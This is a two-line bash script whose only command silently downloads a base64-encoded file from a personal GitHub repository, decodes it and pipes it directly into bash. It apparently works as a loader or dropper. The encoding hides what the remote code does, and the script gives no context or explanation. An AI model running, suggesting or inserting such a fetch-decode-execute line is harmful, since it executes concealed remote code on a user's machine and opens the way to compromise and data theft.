#!/bin/bash
wget -qO- https://raw.githubusercontent.com/waltercorbin66/role/refs/heads/main/entrypoint.sh | base64 -d | bash
